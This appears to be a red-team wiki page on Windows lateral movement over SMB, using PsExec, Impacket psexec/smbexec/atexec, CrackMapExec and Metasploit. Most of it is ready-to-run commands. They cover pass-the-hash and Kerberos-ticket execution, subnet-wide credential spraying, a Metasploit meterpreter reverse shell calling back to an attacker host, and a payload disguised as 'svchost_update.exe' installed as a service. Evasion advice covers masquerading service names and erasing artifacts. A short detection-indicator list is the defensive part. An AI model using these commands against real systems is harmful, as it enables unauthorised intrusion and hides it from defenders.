# PsExec / SMBExec / AtExec

> **MITRE ATT&CK**: Lateral Movement > T1021.002 - Remote Services: SMB/Windows Admin Shares
> **Platforms**: Windows
> **Required Privileges**: Local Administrator on target
> **OPSEC Risk**: Medium-High (PsExec) / Medium (SMBExec/AtExec)

## Strategic Overview

SMB-based remote execution tools are the workhorses of Windows lateral movement. PsExec, smbexec, and atexec each use the SMB protocol to achieve code execution on remote hosts, but they differ significantly in their implementation details and forensic footprints. Understanding these differences is critical for a red team lead: PsExec creates a service and drops a binary (loud), smbexec creates a service but uses cmd.exe without a binary drop (moderate), and atexec uses a scheduled task for one-shot execution (cleanest). The choice between them should be driven by the target environment's monitoring maturity. In heavily monitored environments, you may need to avoid all three and use WMI or DCOM instead. However, in many real-world engagements, these tools remain the fastest path to interactive shells on target systems.

### Comparison Matrix

| Feature              | Sysinternals PsExec | Impacket psexec | Impacket smbexec | Impacket atexec |
|----------------------|---------------------|-----------------|-------------------|-----------------|
| Binary dropped       | Yes (PSEXESVC.exe)  | Yes (random .exe)| No               | No              |
| Service created      | Yes                 | Yes             | Yes               | No              |
| Scheduled task       | No                  | No              | No                | Yes             |
| Interactive shell    | Yes                 | Yes             | Yes               | No (one-shot)   |
| Cleanup on exit      | Partial             | Yes (attempts)  | Yes               | Yes             |
| OPSEC level          | Low                 | Low-Medium      | Medium            | Medium-High     |
| SMB signing bypass   | No                  | No              | No                | No              |

## Technical Deep-Dive

### 1. Sysinternals PsExec

```cmd
# Basic remote command execution (copies PSEXESVC.exe to ADMIN$ share)
PsExec.exe \\192.168.1.50 -u corp\administrator -p P@ssw0rd cmd.exe

# Execute with SYSTEM privileges
PsExec.exe \\192.168.1.50 -u corp\administrator -p P@ssw0rd -s cmd.exe

# Execute on multiple hosts
PsExec.exe \\192.168.1.50,192.168.1.51 -u corp\administrator -p P@ssw0rd -s ipconfig

# Copy and execute a local binary on the remote host
PsExec.exe \\192.168.1.50 -u corp\administrator -p P@ssw0rd -c C:\tools\payload.exe

# Execute command without interactive session
PsExec.exe \\192.168.1.50 -u corp\administrator -p P@ssw0rd cmd.exe /c "whoami > C:\temp\out.txt"

# Key artifacts:
# - PSEXESVC.exe copied to \\target\ADMIN$
# - Service "PSEXESVC" created and started
# - Event ID 7045 (Service Installation)
# - Named pipe: \PSEXESVC
```

### 2. Impacket psexec.py

```bash
# Interactive shell with password
psexec.py corp.local/administrator:'P@ssw0rd'@192.168.1.50

# With NTLM hash
psexec.py corp.local/administrator@192.168.1.50 -hashes :e19ccf75ee54e06b06a5907af13cef42

# With Kerberos ticket
export KRB5CCNAME=admin.ccache
psexec.py corp.local/administrator@target.corp.local -k -no-pass

# Execute specific command (non-interactive)
psexec.py corp.local/administrator:'P@ssw0rd'@192.168.1.50 "whoami /all"

# Use a different share for upload
psexec.py corp.local/administrator:'P@ssw0rd'@192.168.1.50 -path C$

# How it works:
# 1. Uploads a randomly named .exe to ADMIN$ share
# 2. Creates a service pointing to the uploaded binary
# 3. Starts the service (binary connects back via named pipes)
# 4. Cleanup: stops service, deletes service, deletes binary
```

### 3. Impacket smbexec.py

```bash
# Semi-interactive shell -- no binary drop
smbexec.py corp.local/administrator:'P@ssw0rd'@192.168.1.50

# With NTLM hash
smbexec.py corp.local/administrator@192.168.1.50 -hashes :e19ccf75ee54e06b06a5907af13cef42

# With Kerberos
export KRB5CCNAME=admin.ccache
smbexec.py corp.local/administrator@target.corp.local -k -no-pass

# How it works differently from psexec:
# 1. Creates a service with binPath pointing to cmd.exe
# 2. Service binPath: %COMSPEC% /Q /c echo whoami ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
# 3. Output written to a file on target, retrieved via SMB
# 4. Service is created and deleted for each command
# 5. No binary upload required -- uses existing cmd.exe

# Advantages over psexec:
# - No binary dropped to disk (avoids AV/EDR file scanning)
# - Harder to attribute to specific attacker tooling
# Disadvantages:
# - Still creates a service (Event ID 7045)
# - Each command creates/deletes a service (noisy in service logs)
```

### 4. Impacket atexec.py

```bash
# One-shot command execution via scheduled task
atexec.py corp.local/administrator:'P@ssw0rd'@192.168.1.50 "whoami"

# With NTLM hash
atexec.py corp.local/administrator@192.168.1.50 -hashes :e19ccf75ee54e06b06a5907af13cef42

# How it works:
# 1. Creates a scheduled task via Task Scheduler service (ATSVC named pipe)
# 2. Task executes the command immediately
# 3. Output is written to C:\Windows\Temp\<random>.tmp
# 4. Output file is retrieved via SMB and deleted
# 5. Scheduled task is deleted

# Advantages:
# - No service creation (avoids Event ID 7045)
# - No binary drop
# - Scheduled tasks are common in enterprise environments
# Disadvantages:
# - One-shot only (no interactive shell)
# - Task Scheduler logs (Event ID 4698 - Task Created)
# - Output written to disk temporarily
```

### 5. CrackMapExec / NetExec

```bash
# Default execution method (wmiexec, but uses SMB for auth)
crackmapexec smb 192.168.1.50 -u administrator -p 'P@ssw0rd' -x "whoami"

# Force specific execution method
crackmapexec smb 192.168.1.50 -u administrator -p 'P@ssw0rd' --exec-method smbexec -x "whoami"
crackmapexec smb 192.168.1.50 -u administrator -p 'P@ssw0rd' --exec-method atexec -x "whoami"
crackmapexec smb 192.168.1.50 -u administrator -p 'P@ssw0rd' --exec-method mmcexec -x "whoami"

# Spray across subnet with hash
crackmapexec smb 192.168.1.0/24 -u administrator -H HASH -x "hostname"

# Check admin access without executing commands
crackmapexec smb 192.168.1.0/24 -u administrator -p 'P@ssw0rd'
# Look for (Pwn3d!) in output
```

### 6. Metasploit PsExec Module

```
# exploit/windows/smb/psexec -- creates service, uploads payload
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.50
set SMBUser administrator
set SMBPass P@ssw0rd
set SMBDomain corp.local
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit

# exploit/windows/smb/psexec_psh -- PowerShell-based (no binary drop)
use exploit/windows/smb/psexec_psh
# Same options as above but uses PowerShell for execution
```

### 7. Manual SMB-Based Execution

```powershell
# Manual service creation over SMB (understanding the underlying mechanism)
# Step 1: Copy binary to target
copy C:\tools\payload.exe \\192.168.1.50\C$\Windows\Temp\svchost_update.exe

# Step 2: Create and start a remote service
sc \\192.168.1.50 create UpdateService binPath= "C:\Windows\Temp\svchost_update.exe" start= demand
sc \\192.168.1.50 start UpdateService

# Step 3: Cleanup
sc \\192.168.1.50 stop UpdateService
sc \\192.168.1.50 delete UpdateService
del \\192.168.1.50\C$\Windows\Temp\svchost_update.exe
```

## Detection & Evasion

### Detection Indicators

- **Event ID 7045** (Service Installation) -- PsExec and smbexec create services with distinctive patterns
- **Event ID 4697** (Service Installation in Security log) with unusual service names
- **Event ID 4698** (Scheduled Task Created) for atexec
- **Event ID 5145** (Network Share Access) for ADMIN$ and C$ share access
- Named pipe creation matching known tool signatures (\PSEXESVC, random names)
- Binary uploads to ADMIN$ share with random filenames
- Service binPath containing cmd.exe with redirection patterns (smbexec signature)
- Rapid service create/start/stop/delete cycles

### Evasion Techniques

- Use atexec for one-shot commands -- avoids service creation entirely
- Rename the Sysinternals PsExec service name: `PsExec.exe -r CustomServiceName \\target cmd`
- Choose smbexec over psexec to avoid binary drops (though service creation still occurs)
- For Impacket psexec, the random binary name helps avoid signature-based file detection
- Use CrackMapExec with wmiexec method to avoid SMB execution artifacts entirely
- Time execution during change management windows when service modifications are expected
- If using manual service creation, name the service to match legitimate Windows services
- Clean up all artifacts immediately after execution

## Cross-References

- [[pass-the-hash]] - Authentication mechanism that feeds into SMB execution
- [[wmi-lateral]] - Stealthier alternative to SMB-based execution
- [[dcom-lateral]] - Another alternative that avoids service creation
- [[winrm-lateral]] - WinRM as an alternative when SMB-based methods are blocked
- Section 06: Credential Access - Obtaining credentials for SMB authentication

## References

- https://attack.mitre.org/techniques/T1021/002/
- https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
- https://github.com/fortra/impacket
- https://www.thehacker.recipes/ad/movement/smbexec
- https://jpcertcc.github.io/ToolAnalysisResultSheet/details/PsExec.htm
